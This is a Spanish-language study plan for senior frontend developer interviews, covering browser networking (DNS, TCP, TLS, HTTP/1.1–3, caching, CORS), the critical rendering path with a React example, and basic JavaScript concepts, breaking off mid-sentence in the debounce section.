# Plan de estudio: Senior Frontend Developer

Plan de profundización técnica para preparar entrevistas y trabajo de Senior
Frontend Developer. Cada epígrafe se estudia en una sesión separada, con
teoría (el "por qué") y ejemplos explicados paso a paso (el "cómo se ve en la
práctica"). El Glosario al final acumula las siglas usadas en este archivo.

Orden del plan completo (este archivo desarrolla el punto 1):

1. Fundamentos web: navegador, protocolos, HTTP
2. JavaScript profundo
3. TypeScript avanzado
4. React / framework en profundidad
5. APIs y comunicación cliente-servidor
6. Gestión de estado y datos
7. Estrategias de renderizado y meta-frameworks
8. Performance web y Core Web Vitals
9. Accesibilidad e i18n
10. Seguridad en frontend
11. Testing y calidad
12. Arquitectura frontend a escala
13. Build tools y tooling moderno
14. CI/CD, despliegue y observabilidad
15. IA aplicada al desarrollo frontend
16. Habilidades de senior (no técnicas)
17. Preparación específica para entrevistas

## 1. Fundamentos web: el navegador, sus protocolos y el ciclo completo de una petición

- Qué ocurre paso a paso desde que escribes una URL hasta que ves la página

  - **Teoría**: cargar una página web no es "un paso", son dos fases bien
    diferenciadas: primero una fase de **red** (conseguir los bytes del
    servidor) y luego una fase de **procesamiento en el navegador**
    (convertir esos bytes en píxeles en pantalla). Entender esta secuencia
    completa es lo que te permite saber *dónde* optimizar cuando algo va
    lento: no es lo mismo un problema de red (servidor lento, muchos
    round-trips) que un problema de renderizado (JS bloqueando el hilo
    principal).
  - **Ejemplo paso a paso** (visitar `https://miapp.com/dashboard`):
    1. El navegador parsea la URL: protocolo (`https`), host (`miapp.com`),
       puerto (`443` implícito), ruta (`/dashboard`).
    2. Resuelve el dominio a una IP vía **DNS** (ver siguiente punto).
    3. Abre una conexión **TCP** con esa IP (handshake de 3 pasos).
    4. Como es `https`, negocia una conexión **TLS** sobre esa conexión TCP
       (cifrado).
    5. Envía la petición HTTP: `GET /dashboard HTTP/1.1` + headers.
    6. El servidor procesa la petición (puede consultar una base de datos,
       ejecutar lógica de backend) y responde: status code + headers + el
       HTML como body.
    7. El navegador empieza a parsear el HTML **de forma incremental**,
       sin esperar a que termine de llegar todo (streaming).
    8. A medida que parsea las etiquetas, construye el **DOM** (árbol de
       nodos en memoria).
    9. Cuando encuentra un `<link rel="stylesheet">` o un `<style>`,
       descarga/parsea el CSS y construye el **CSSOM**.
    10. Con DOM + CSSOM combina un **Render Tree** (solo nodos visibles;
        un `display: none` no entra aquí).
    11. Calcula el **Layout** (la posición y el tamaño exacto de cada
        elemento en la pantalla).
    12. Hace **Paint** (convierte cada elemento en píxeles, en capas).
    13. Hace **Composite** (combina esas capas usando la GPU, respetando
        `z-index`, `transform`, `opacity`).
    14. En paralelo, descarga y ejecuta el JS. Ese JS puede modificar el
        DOM/CSSOM, lo que dispara un nuevo ciclo de Layout → Paint →
        Composite (por eso el JS "cuesta más" que solo HTML/CSS: puede
        reiniciar todo el proceso).
    15. Se dispara el evento `load` y la página queda interactiva.

    Puedes ver estas fases separadas en Chrome DevTools → pestaña
    **Network** (fases 1-6) y pestaña **Performance** (fases 7-14, con un
    grabado de "record" verás bloques literalmente llamados `Parse HTML`,
    `Layout`, `Paint`, `Composite Layers`).

- Resolución DNS (*Domain Name System*)

  - **Teoría**: los humanos usamos nombres (`miapp.com`), pero las
    computadoras enrutan tráfico usando direcciones IP. DNS es el sistema
    (jerárquico y distribuido) que traduce uno en otro. La resolución pasa
    por varias capas de caché antes de hacer una consulta real por red:
    caché del navegador → caché del sistema operativo → resolver DNS del
    router/ISP → si nadie lo tiene, consulta a un servidor raíz, luego al
    servidor del TLD (*Top-Level Domain*, ej. `.com`), y finalmente al
    servidor autoritativo del dominio. Cada uno de estos saltos, si no está
    cacheado, añade latencia (round-trips completos de red) **antes** de
    poder siquiera abrir la conexión TCP.
  - **Ejemplo**: en una terminal puedes ver la resolución real:
    ```bash
    dig miapp.com

    # ;; ANSWER SECTION:
    # miapp.com.   300   IN   A   93.184.216.34
    ```
    El `300` es el TTL (*Time To Live*, en segundos) — cuánto tiempo se
    puede cachear esa respuesta antes de volver a preguntar. Esto es lo que
    aprovecha `<link rel="preconnect">` (visto en la sección 1 de
    `GOOD-FRONTEND-PRACTICES.md`): si sabes que vas a pedir datos a
    `api.miapp.com`, adelantas esta resolución DNS antes de que el
    navegador la descubra por sí solo al leer un `fetch`.

- Handshake TCP (*Transmission Control Protocol*)

  - **Teoría**: TCP es un protocolo "orientado a conexión" y fiable: antes
    de enviar un solo byte de datos, cliente y servidor deben acordar que
    ambos están listos y sincronizar números de secuencia. Esto se hace con
    3 pasos (**3-way handshake**), y cada paso es un viaje de ida (o ida y
    vuelta) por la red, es decir, **1 RTT** (*Round-Trip Time*, el tiempo
    que tarda un paquete en ir y volver) completo se gasta solo en esto,
    antes de poder empezar siquiera con TLS.
  - **Ejemplo paso a paso**:
    1. Cliente → Servidor: `SYN` ("quiero conectarme, mi número de
       secuencia inicial es X").
    2. Servidor → Cliente: `SYN-ACK` ("recibido, aquí está el mío, número Y").
    3. Cliente → Servidor: `ACK` ("confirmado, empezamos").

    Con la conexión TCP abierta, recién ahí puede empezar el handshake TLS
    (si es HTTPS) o la petición HTTP directa (si es HTTP plano). Por esto
    HTTP/1.1 reutiliza conexiones (`Connection: keep-alive`): abrir una
    conexión TCP nueva para cada petición sería pagar este RTT una y otra
    vez.

- Handshake TLS (*Transport Layer Security*)

  - **Teoría**: TLS es lo que cifra la conexión (el candado de HTTPS) y
    verifica que el servidor es quien dice ser (certificados). En **TLS
    1.2** este handshake toma **2 RTT** adicionales (negociar versión y
    cifrado, intercambiar y validar el certificado, derivar las claves de
    sesión). **TLS 1.3** (el estándar actual) rediseñó el protocolo para
    hacerlo en **1 RTT**, y si el cliente ya se conectó antes al mismo
    servidor, puede reanudar la sesión con **0-RTT** (enviando datos de
    aplicación en el mismo paquete del handshake). Esto es una razón
    directa por la que actualizar a TLS 1.3 mejora el tiempo de carga sin
    tocar una sola línea de código de la app.
  - **Ejemplo**: puedes inspeccionar qué versión de TLS usa un sitio en
    Chrome DevTools → Security tab, o desde terminal:
    ```bash
    openssl s_client -connect miapp.com:443 -tls1_3
    # Verifica en la salida: "Protocol : TLSv1.3"
    ```
    En resumen de latencia acumulada para la **primera** petición HTTPS a
    un dominio nuevo: 1 RTT (TCP) + 1-2 RTT (TLS) + 1 RTT (la petición HTTP
    en sí) — de ahí que `preconnect` (que adelanta TCP+TLS) pueda ahorrar
    hasta 2-3 RTT reales en la primera interacción con ese dominio.

- HTTP/1.1 vs HTTP/2 vs HTTP/3 (QUIC)

  - **Teoría**: cada versión de HTTP resolvió un cuello de botella distinto.
    - **HTTP/1.1**: una conexión TCP solo puede tener una petición
      "en vuelo" a la vez de forma ordenada (*head-of-line blocking* a
      nivel de aplicación). Para paralelizar, los navegadores abren varias
      conexiones TCP en paralelo al mismo dominio (típicamente un límite de
      6). Por eso durante años se usó "domain sharding" (repartir assets
      entre `img1.miapp.com`, `img2.miapp.com`) para esquivar ese límite.
    - **HTTP/2**: introduce *multiplexado* — una sola conexión TCP puede
      llevar muchos "streams" (peticiones) en paralelo, intercalados en
      frames binarios. Ya no necesitas 6 conexiones ni domain sharding (de
      hecho, con HTTP/2 el sharding es contraproducente). El límite que
      queda es a nivel de TCP: si un paquete se pierde, **todos** los
      streams de esa conexión se bloquean esperando la retransmisión (HOL
      blocking, pero ahora a nivel de transporte, no de aplicación).
    - **HTTP/3**: corre sobre **QUIC**, un protocolo de transporte sobre
      **UDP** (en vez de TCP) diseñado por Google. QUIC multiplexa los
      streams de forma que la pérdida de un paquete solo bloquea *ese*
      stream, no la conexión entera — resuelve el HOL blocking que
      persistía en HTTP/2. Además integra TLS 1.3 dentro del mismo
      handshake de transporte, reduciendo aún más los RTT necesarios para
      empezar a transferir datos.
  - **Ejemplo**: carga de una página con 50 imágenes pequeñas:
    - Con HTTP/1.1 (y sin sharding): 6 imágenes en paralelo, el resto en
      cola — se completan en "tandas".
    - Con HTTP/2: las 50 se piden en la misma conexión, multiplexadas; en
      una red sin pérdida de paquetes, esto es sensiblemente más rápido.
    - Con HTTP/3: igual que HTTP/2 pero además resiliente a redes
      inestables (WiFi débil, 4G) donde antes una pérdida de paquete
      frenaba todo el lote.

    Puedes ver qué protocolo usó cada petición en Chrome DevTools → Network
    → columna "Protocol" (verás `h2` o `h3`).

- Métodos HTTP, códigos de estado y headers

  - **Teoría**: HTTP define métodos con semántica específica — algunos son
    **seguros** (no deberían modificar estado en el servidor: `GET`,
    `HEAD`) y algunos son **idempotentes** (ejecutarlos una o varias veces
    con los mismos datos produce el mismo resultado: `GET`, `PUT`,
    `DELETE`, pero **no** `POST`). Respetar esta semántica importa: un
    proxy o un navegador puede reintentar automáticamente una petición
    `GET` fallida (es segura), pero nunca debería reintentar un `POST` sin
    confirmarlo (podría duplicar una compra). Los códigos de estado se
    agrupan por familia: `1xx` informativos, `2xx` éxito, `3xx`
    redirecciones, `4xx` error del cliente, `5xx` error del servidor.
  - **Ejemplo**:
    ```ts
    // GET: seguro e idempotente — el navegador puede cachearlo y reintentarlo
    fetch('/api/products');

    // POST: NO idempotente — llamarlo dos veces crea dos pedidos
    fetch('/api/orders', { method: 'POST', body: JSON.stringify(order) });

    // PUT: idempotente — llamarlo dos veces deja el recurso en el mismo estado
    fetch('/api/products/42', { method: 'PUT', body: JSON.stringify(product) });
    ```
    Códigos comunes que todo frontend debe distinguir en su manejo de
    errores: `200 OK`, `201 Created`, `204 No Content`, `301/302`
    (redirección permanente/temporal), `304 Not Modified` (ver caching más
    abajo), `400 Bad Request` (el cliente mandó datos inválidos), `401
    Unauthorized` (falta autenticación), `403 Forbidden` (autenticado pero
    sin permiso), `404 Not Found`, `429 Too Many Requests` (rate limiting),
    `500 Internal Server Error`.

- Caching HTTP

  - **Teoría**: el caching HTTP evita re-descargar un recurso que no ha
    cambiado. Hay dos estrategias que se combinan:
    - **Caching por frescura** (`Cache-Control: max-age=3600`): el
      navegador ni siquiera pregunta al servidor durante ese tiempo, usa
      la copia local directamente.
    - **Caching por validación** (`ETag` / `Last-Modified`): pasado el
      tiempo de frescura, el navegador pregunta "¿sigue siendo válido
      esto?" con una petición condicional; si el servidor confirma que no
      cambió, responde `304 Not Modified` **sin body**, ahorrando el
      ancho de banda de descargar el recurso de nuevo.
  - **Ejemplo**:
    ```
    # Primera petición — respuesta del servidor
    HTTP/1.1 200 OK
    Cache-Control: max-age=3600
    ETag: "a1b2c3"

    # Segunda petición, después de que expiró max-age (1 hora)
    GET /styles.css
    If-None-Match: "a1b2c3"

    # Si el archivo no cambió:
    HTTP/1.1 304 Not Modified
    # (sin body — el navegador reusa la copia que ya tenía)
    ```
    `Cache-Control: no-store` significa "nunca guardes esto" (datos
    sensibles); `no-cache` significa "guárdalo, pero siempre revalida antes
    de usarlo" (a pesar del nombre, sí cachea).

- Cookies, sesiones y CORS (*Cross-Origin Resource Sharing*)

  - **Teoría**: por defecto, el navegador aplica la **same-origin policy**:
    un script cargado desde `miapp.com` no puede leer la respuesta de una
    petición a `api-externa.com` a menos que ese servidor lo autorice
    explícitamente. CORS es el mecanismo de esa autorización, vía headers.
    Para peticiones "simples" (`GET`/`POST` con headers básicos), el
    navegador manda la petición directamente y solo bloquea la
    *lectura* de la respuesta si falta el header de autorización. Para
    peticiones "no simples" (headers custom, `PUT`/`DELETE`, `Content-Type:
    application/json`), el navegador primero manda una petición
    **preflight** (`OPTIONS`) preguntando "¿me dejas hacer esto?", y solo
    si la respuesta lo autoriza, manda la petición real. Las cookies, por
    su parte, se asocian a un dominio y se envían automáticamente en cada
    petición a ese dominio — por eso son el mecanismo clásico de sesión, y
    por eso también son el objetivo de ataques CSRF.
  - **Ejemplo paso a paso** (frontend en `app.miapp.com` llamando a `api.miapp.com`):
    1. El navegador ve que el `fetch` usa `Content-Type: application/json`
       y método `PUT` → no es "simple" → dispara un preflight.
    2. Preflight: `OPTIONS /users/42` con headers
       `Access-Control-Request-Method: PUT`.
    3. El servidor debe responder con
       `Access-Control-Allow-Origin: https://app.miapp.com` y
       `Access-Control-Allow-Methods: PUT`.
    4. Solo si esa respuesta autoriza, el navegador manda la petición
       `PUT` real.
    ```ts
    // Esto dispara preflight por el Content-Type y el método PUT
    fetch('https://api.miapp.com/users/42', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // envía cookies aunque sea cross-origin
      body: JSON.stringify({ name: 'Ana' }),
    });
    ```
    Si el servidor no responde con los headers `Access-Control-Allow-*`
    correctos, el navegador bloquea la lectura de la respuesta en el
    frontend (verás el clásico error "blocked by CORS policy" en consola)
    — esto lo decide y lo aplica el **navegador**, no el servidor; el
    servidor solo declara qué permite.

- Cómo el navegador construye la página (Critical Rendering Path)

  - **Teoría**: el Critical Rendering Path es la secuencia que convierte
    bytes de HTML/CSS en píxeles en pantalla. El HTML no trae píxeles: es
    texto. Cada etapa transforma un tipo de dato en otro. El navegador no
    puede pintar hasta tener **DOM + CSSOM** combinados en un Render Tree;
    layout da geometría; paint genera un plan de dibujo; raster convierte
    ese plan en bitmaps (texturas); composite mezcla esas capas en un
    frame; el monitor muestra ese frame (~60 veces por segundo).

    Un `<script>` sin `async`/`defer` en el `<head>` **bloquea** el parseo
    del HTML hasta descargarse y ejecutarse (por eso se usa `defer` o
    `type="module"`). Un elemento con `display: none` no entra al Render
    Tree; uno con `visibility: hidden` sí entra (ocupa espacio) pero no
    se pinta.

    **React (u otro framework) no sustituye el CRP**: es JavaScript que
    corre en el Renderer Process. En el primer paint puede: (a) bloquear
    el parser si el `<script>` es clásico en medio del HTML, o (b) correr
    después del parseo (`defer` / bundle al final) y montar la app sobre
    un nodo vacío (`#root`). Cuando React hace commit (cambia el DOM
    real), el navegador no "reparsea el HTML desde la red": invalida
    estilos/layout/paint de lo que cambió y reentra el pipeline desde
    ahí (pasos 4–9, o solo paint/composite si no cambió geometría).

    Diagrama del pipeline:

    ```
    1. Bytes HTML llegan por red
    2. Parser → DOM
       2b. <script> React/bundle → descarga + ejecuta
           (bloquea el parser si no hay async/defer;
            si hay defer/module, se ejecuta al terminar el parseo)
    3. CSS → CSSOM
    4. DOM + CSSOM → Render Tree   (qué se ve; display:none fuera)
    5. Layout (reflow)             (dónde está cada caja y qué tamaño tiene)
    6. Paint (record)              (qué dibujar: "rellena rectángulo…")
    7. Rasterize                   (ejecuta esas órdenes → bitmap / textura)
    8. Composite                   (GPU mezcla capas → frame)
    9. Monitor muestra el frame    (~60 veces por segundo)

    10. React commit (setState / click / fetch) → muta el DOM
    11. Reentrada: Style → Layout? → Paint? → Raster? → Composite → Monitor
        (solo las etapas que el cambio invalidó)
    ```

  - **Ejemplo paso a paso** (CSR típico con React; viewport 800×600):

    ```html
    <!DOCTYPE html>
    <html>
      <head>
        <link rel="stylesheet" href="app.css" />
      </head>
      <body>
        <div id="root"></div>
        <!-- type=module: no bloquea el parseo; se ejecuta cuando el HTML ya es DOM -->
        <script type="module" src="/main.jsx"></script>
      </body>
    </html>
    ```
    ```css
    /* app.css */
    body { margin: 0; font-family: system-ui; }
    h1 { font-size: 32px; color: #111; }
    .cta {
      width: 120px;
      height: 40px;
      background: #2563eb;
      color: white;
      border: none;
    }
    .oculto { display: none; }
    ```
    ```jsx
    // main.jsx (bundle de React)
    import { createRoot } from 'react-dom/client';
    import { useState } from 'react';

    function App() {
      const [n, setN] = useState(0);
      return (
        <>
          <h1>Hola</h1>
          <button className="cta" onClick={() => setN(n + 1)}>
            Comprar ({n})
          </button>
          <div className="oculto">No me veas</div>
        </>
      );
    }

    createRoot(document.getElementById('root')).render(<App />);
    ```

    **Paso 1 — Bytes HTML llegan por red**  
    Tras DNS/TCP/TLS, el servidor responde el HTML como bytes
    (`text/html; charset=utf-8`). En el body solo hay un
    `<div id="root"></div>` vacío y la etiqueta del script: **aún no
    existen** el `h1` ni el botón en el documento. Todavía no hay DOM ni
    píxeles: solo un stream de caracteres. El navegador puede empezar a
    parsear **antes** de que termine de llegar todo (streaming).

    **Paso 2 — Parser → DOM**  
    El HTML parser convierte etiquetas en un árbol de nodos en memoria:

    ```
    Document
    └── html
        ├── head
        │   └── link[rel=stylesheet, href=app.css]
        └── body
            ├── div#root   (vacío)
            └── script[type=module src=/main.jsx]
    ```

    `document.getElementById('root')` ya apunta a ese nodo, pero aún no
    hay hijos ni se sabe tamaño, color ni posición en pantalla. Con
    `type="module"` el script **no bloquea** el resto del parseo; se
    descarga en paralelo y se ejecuta cuando el documento ya está
    parseado (equivalente práctico a `defer`).

    **Paso 2b — Descarga y ejecución de React**  
    El navegador pide `/main.jsx` (y el runtime de React). Al
    ejecutarse, React no "pinta" solo: llama a `createRoot(...).render`,
    calcula el Virtual DOM y hace el **primer commit** al DOM real:

    ```
    div#root
    ├── h1 → "Hola"
    ├── button.cta → "Comprar (0)"
    └── div.oculto → "No me veas"
    ```

    Eso es una mutación del DOM **después** del HTML inicial. Si el
    script hubiera sido clásico sin `defer` en el `<head>`, el parser
    se habría **pausado** aquí hasta terminar de bajar y ejecutar React
    (peor para FCP). React no dibuja píxeles: solo cambia el DOM; quien
    produce píxeles sigue siendo paint → raster → composite.

    **Paso 3 — CSS → CSSOM**  
    Al ver el `<link>`, descarga `app.css`, lo parsea y construye el
    CSSOM (árbol de reglas: selectores + declaraciones). Hasta tener el
    CSSOM, el navegador suele **bloquear el primer paint** (evitar FOUC:
    flash of unstyled content). El CSSOM de este ejemplo queda así:

    ```
    body    → { margin: 0; font-family: system-ui }
    h1      → { font-size: 32px; color: #111 }
    .cta    → { width: 120px; height: 40px; background: #2563eb;
                color: white; border: none }
    .oculto → { display: none }
    ```

    En la práctica CSS y el module pueden solaparse en red; el primer
    paint útil de la app suele esperar a CSSOM + a que React haya metido
    nodos en `#root` (si no, verías solo la página vacía).

    **Paso 4 — DOM + CSSOM → Render Tree**  
    Se combinan solo los nodos **visibles** con sus estilos computados.
    Tras el mount de React, el DOM bajo `#root` tiene `h1`, `.cta` y
    `.oculto`, pero `div.oculto` tiene `display: none` → **no entra** al
    Render Tree (ni layout ni paint). El árbol a renderizar queda:

    ```
    body (margin: 0, font-family: system-ui, …)
    └── div#root
        ├── h1 ("Hola", font-size 32px, color #111)
        └── button.cta ("Comprar (0)", 120×40, fondo #2563eb, color white)
        ✗ div.oculto  ← fuera: display:none (no ocupa espacio, no se pinta)
    ```

    Nota: si fuera `visibility: hidden` en vez de `display: none`, el
    nodo **sí** entraría al Render Tree (reserva su caja en layout) pero
    no se pintaría — útil para animaciones de fade. `#root` es solo el
    contenedor; lo visible son sus hijos.

    **Paso 5 — Layout (reflow)**  
    El navegador calcula la caja de cada nodo del Render Tree: x, y,
    width, height en coordenadas del viewport. Ejemplo (simplificado):

    ```
    body:   x=0,   y=0,   width=800, height=… (según contenido)
    h1:     x=0,   y=0,   width=800, height≈38  (línea de 32px)
    button: x=0,   y=38,  width=120, height=40
    ```

    Todavía no hay píxeles: solo números de geometría. Cambiar `width` o
    el texto del `h1` forzaría otro layout (reflow).

    **Paso 6 — Paint (record)**  
    Con las cajas listas, genera una **lista de dibujo** (display items),
    no bitmaps aún. Órdenes conceptuales:

    ```
    Capa principal:
      1. Rellenar rect (0,0)–(800,600) con fondo (blanco por defecto)
      2. Dibujar texto "Hola" en (0, ~32) con color #111, font 32px
      3. Rellenar rect (0,38)–(120,78) con #2563eb
      4. Dibujar texto "Comprar (0)" centrado en ese rect, color white
    ```

    `div.oculto` no genera ninguna orden. Paint responde a "qué dibujar";
    aún no llena la grilla de píxeles.

    **Paso 7 — Rasterize**  
    Un rasterizer (CPU o GPU) ejecuta esa lista y produce **texturas**:
    matrices de píxeles RGBA. Ejemplo: la capa del botón puede ser un
    bitmap ~120×40 donde cada celda es un color (`#2563eb` en el fondo,
    blanco en los glifos de "Comprar (0)"). Ahí nacen los píxeles en
    memoria (VRAM/RAM), no todavía en el monitor.

    **Paso 8 — Composite**  
    El **GPU Process** / compositor toma las texturas (capas), aplica
    `transform`, `opacity`, `z-index`, y las mezcla en un **frame**
    (framebuffer del tamaño del viewport, p. ej. 800×600). Si más tarde
    solo animas `transform: translateY(10px)` en el botón y ya es su
    propia capa, se reutiliza el bitmap del paso 7 y solo se recompone
    (composite-only; ver sección 8).

    **Paso 9 — Monitor muestra el frame**  
    El framebuffer se envía a la pantalla. A ~60 Hz el compositor
    intenta entregar un frame cada ~16.7 ms. Lo que ves es esa imagen
    final: tipografía del `h1` y botón azul "Comprar (0)". El
    `div.oculto` nunca apareció porque salió del pipeline en el paso 4.
    Hasta aquí: **primer paint de la app**.

    **Paso 10 — React actualiza el DOM (interacción)**  
    El usuario hace clic. React corre el `onClick` en el hilo
    principal → `setN(1)` → re-render en Virtual DOM → **commit**: no
    reescribe todo el HTML desde el servidor; solo actualiza el texto
    del botón en el DOM ya existente:

    ```
    button.cta: "Comprar (0)"  →  "Comprar (1)"
    ```

    (React usa el reconciler: mismo nodo `button`, cambia el text node.)

    **Paso 11 — Reentrada al pipeline**  
    El navegador detecta el cambio de contenido. Como cambió el texto,
    puede invalidar **layout** (el ancho del texto puede cambiar) +
    **paint** + raster + composite de esa región — **sin** repetir
    pasos 1–3. Si solo cambiaras un `color` vía clase, saltarías layout
    y harías paint→…; si solo `transform`/`opacity` en una capa,
    composite-only (sección 8).

    En DevTools → Performance: el primer load muestra `Parse HTML`,
    evaluación del script/React, luego `Layout`/`Paint`/`Composite`.
    Cada clic con `setState` añade de nuevo trabajo de script + las
    etapas de render que ese commit invalidó. Network cubre el paso 1
    (y la descarga de `app.css` / `main.jsx`).

- Arquitectura interna del navegador (multi-proceso)

  - **Teoría**: un navegador moderno (Chrome/Edge con Blink, Firefox con
    Gecko, Safari con WebKit) no corre como un solo programa monolítico.
    Se divide en procesos separados del sistema operativo: un **Browser
    Process** (la ventana, la barra de direcciones, coordina todo), uno o
    varios **Renderer Process** (cada uno ejecuta el motor de renderizado
    y el motor de JS — en Chrome, cada sitio distinto suele tener su
    propio proceso, llamado *Site Isolation*), un **GPU Process** (compone
    las capas usando la tarjeta gráfica) y un **Network Process**. Esta
    separación tiene dos beneficios concretos: si la pestaña de un sitio
    se cuelga o crashea, no se lleva abajo el navegador completo; y por
    seguridad, un proceso comprometido de un sitio no puede leer memoria
    de otro sitio (esto es justamente lo que mitiga ataques de tipo
    Spectre entre pestañas).
  - **Ejemplo**: abre el Task Manager de Chrome (`Shift + Esc`, o menú →
    Más herramientas → Administrador de tareas) con varias pestañas
    abiertas de distintos dominios: verás una fila de proceso separada por
    cada pestaña/sitio, cada una con su propio uso de CPU y memoria — es
    la evidencia visual de que cada sitio corre aislado.

- Comunicación en tiempo real: WebSockets, Server-Sent Events y long polling

  - **Teoría**: HTTP tradicional es petición-respuesta (el cliente siempre
    inicia). Cuando necesitas que el **servidor** empuje datos sin que el
    cliente pregunte constantemente, hay tres opciones con distinto
    trade-off:
    - **WebSocket**: conexión persistente y **bidireccional** (ambos lados
      mandan mensajes en cualquier momento). Ideal para chat, edición
      colaborativa, juegos en tiempo real.
    - **Server-Sent Events (SSE)**: conexión persistente pero
      **unidireccional** (solo servidor → cliente), corre sobre HTTP
      normal (más simple de implementar/depurar que WebSocket). Ideal para
      notificaciones, feeds de actividad, progreso de una tarea larga.
    - **Long polling**: el cliente hace una petición HTTP normal, pero el
      servidor la deja "colgada" sin responder hasta que hay datos nuevos
      (o hasta un timeout); el cliente, al recibir respuesta, abre otra
      inmediatamente. Es el fallback más compatible cuando no puedes usar
      las opciones anteriores (proxies/firewalls muy restrictivos).
  - **Ejemplo**:
    ```ts
    // WebSocket: bidireccional
    const ws = new WebSocket('wss://miapp.com/chat');
    ws.onmessage = (event) => console.log('Mensaje del servidor:', event.data);
    ws.send('hola'); // el cliente también puede iniciar el envío

    // Server-Sent Events: solo servidor -> cliente, sobre HTTP normal
    const stream = new EventSource('/api/notifications');
    stream.onmessage = (event) => console.log('Notificación:', event.data);

    // Long polling: el cliente vuelve a pedir apenas recibe respuesta
    async function poll() {
      const res = await fetch('/api/updates'); // el servidor la retiene hasta tener datos
      const data = await res.json();
      render(data);
      poll(); // se repite indefinidamente
    }
    ```

## 2. JavaScript profundo

### Básico

- `const` vs `let` vs `var`

  - **Teoría**: `var` tiene **scope de función** (visible en toda la
    función aunque esté dentro de un `if` o un `for`) y se puede
    reasignar y redeclarar. `let` y `const` tienen **scope de bloque**
    (solo existen dentro de las llaves `{}` donde se declararon). La
    diferencia entre `let` y `const` es únicamente sobre la **variable**:
    `const` no permite reasignarla, pero si esa variable guarda un objeto
    o array, su contenido sí se puede mutar — `const` no significa
    "inmutable".
  - **Ejemplo paso a paso**:
    ```js
    function ejemploScope() {
      if (true) {
        var x = 1; // function-scoped: se "escapa" del bloque if
        let y = 2; // block-scoped: solo existe dentro de este if
      }
      console.log(x); // 1 -- var sí es visible aquí
      console.log(y); // ReferenceError: y is not defined
    }

    const persona = { nombre: 'Ana' };
    persona.nombre = 'Beatriz'; // válido: no reasigna la variable, muta el objeto
    persona = {}; // TypeError: Assignment to constant variable
    ```

- Hoisting y *temporal dead zone*

  - **Teoría**: durante la fase de compilación, JS "eleva" las
    declaraciones al inicio de su scope. Una `var` se eleva **e
    inicializa** con `undefined` de inmediato (por eso leerla antes de su
    línea no da error, solo `undefined`). Una función declarada con
    `function nombre() {}` se eleva **completa**, por eso se puede llamar
    antes de su definición en el código. `let`/`const` también se elevan,
    pero quedan en la **temporal dead zone (TDZ)**: existen mas no se
    pueden leer hasta que el motor ejecuta su línea de declaración —
    intentarlo antes lanza un error, a propósito, para evitar bugs.
  - **Ejemplo paso a paso**:
    ```js
    console.log(a); // undefined -- var hoisted, aún sin asignar
    var a = 1;

    console.log(b); // ReferenceError: Cannot access 'b' before initialization
    let b = 2;

    saludar(); // "Hola" -- las function declarations se hoistean completas
    function saludar() {
      console.log('Hola');
    }
    ```

- `==` vs `===` y coerción de tipos

  - **Teoría**: `===` (igualdad estricta) compara valor **y** tipo, sin
    convertir nada. `==` (igualdad laxa) primero **coerciona** (convierte)
    los operandos a un tipo común y luego compara, siguiendo reglas no
    siempre intuitivas. La recomendación general es usar siempre `===` y
    reservar `==` solo para el caso explícito de comparar contra `null`
    (donde `== null` cubre tanto `null` como `undefined` a la vez).
  - **Ejemplo**:
    ```js
    '' == 0; // true  -- coerciona '' a 0 antes de comparar
    '' === 0; // false -- distinto tipo, no coerciona

    null == undefined; // true  -- regla especial del lenguaje
    null === undefined; // false -- distinto tipo

    '5' == 5; // true  -- coerciona '5' a 5
    '5' === 5; // false -- distinto tipo
    ```

- Truthy / falsy

  - **Teoría**: en un condicional, JS convierte implícitamente cualquier
    valor a `boolean`. Solo **ocho** valores son *falsy*: `false`, `0`,
    `-0`, `0n`, `''`, `null`, `undefined` y `NaN`. **Todo lo demás** es
    *truthy*, incluyendo casos que sorprenden: el string `'0'` (no está
    vacío), un array vacío `[]` y un objeto vacío `{}` (son objetos, y
    todo objeto es truthy).
  - **Ejemplo**:
    ```js
    if ('0') console.log('esto SÍ se ejecuta'); // '0' es truthy (string no vacío)
    if ([]) console.log('esto también');         // [] es truthy (es un objeto)
    if (0) console.log('esto NO se ejecuta');    // 0 es falsy
    ```

- Primitivos vs referencias (pass-by-value vs pass-by-reference)

  - **Teoría**: los tipos primitivos (`string`, `number`, `boolean`,
    `null`, `undefined`, `symbol`, `bigint`) se copian **por valor**: al
    asignarlos a otra variable, se duplica el dato. Los objetos, arrays y
    funciones se copian **por referencia**: la variable no guarda el
    objeto en sí, guarda un puntero a su ubicación en memoria — copiar la
    variable copia el puntero, no el objeto.
  - **Ejemplo**:
    ```js
    let a = 5;
    let b = a;
    b = 10;
    console.log(a); // 5 -- no cambia, el primitivo se copió por valor

    const obj1 = { valor: 5 };
    const obj2 = obj1; // copia la referencia, no crea un objeto nuevo
    obj2.valor = 10;
    console.log(obj1.valor); // 10 -- es el mismo objeto en memoria

    const copiaSuperficial = { ...obj1 }; // shallow copy: nuevo objeto en el primer nivel
    ```

- Destructuring, spread y rest

  - **Teoría**: *destructuring* extrae valores de un objeto/array en
    variables individuales. *Spread* (`...`) "expande" un objeto/array en
    otro. *Rest* (`...`, misma sintaxis, contexto contrario) "agrupa" el
    resto de elementos/argumentos en uno solo. Se usa constantemente al
    trabajar con props de React y con actualizaciones inmutables de
    estado.
  - **Ejemplo**:
    ```js
    const persona = { nombre: 'Ana', edad: 30, ciudad: 'Bogotá' };
    const { nombre, ...resto } = persona; // destructuring + rest
    // nombre = 'Ana', resto = { edad: 30, ciudad: 'Bogotá' }

    const actualizada = { ...persona, edad: 31 }; // spread: nuevo objeto, no muta el original

    function sumar(...numeros) {
      // rest params: agrupa todos los argumentos en un array
      return numeros.reduce((acc, n) => acc + n, 0);
    }
    sumar(1, 2, 3); // 6
    ```

- Optional chaining (`?.`) y nullish coalescing (`??`)

  - **Teoría**: `?.` corta la evaluación y devuelve `undefined` en vez de
    lanzar un error si algo en la cadena es `null`/`undefined`. `??`
    devuelve el valor de la derecha **solo** si el de la izquierda es
    `null` o `undefined` — a diferencia de `||`, que también reemplaza
    valores válidos como `0` o `''`, algo que suele causar bugs sutiles.
  - **Ejemplo**:
    ```js
    const ciudad = usuario?.direccion?.ciudad; // undefined si direccion no existe, sin error

    const cantidad = input.value ?? 10; // 10 solo si input.value es null/undefined
    const cantidadConOr = input.value || 10; // BUG: también da 10 si input.value es 0
    ```

- Debounce y throttle

  - **Teoría**: son dos técnicas para controlar cuántas veces se ejecuta
    una función frente a un evento que se dispara muy seguido (escribir
    en un buscador, hacer scroll, redimensionar la ventana). **Debounce**
    espera a que haya una "pausa" en los eventos antes de ejecutar (ideal
    para autocompletar: no busques en cada tecla, busca cuando el usuario
    deja de escribir). **Throttle** ejecuta como máximo una vez cada
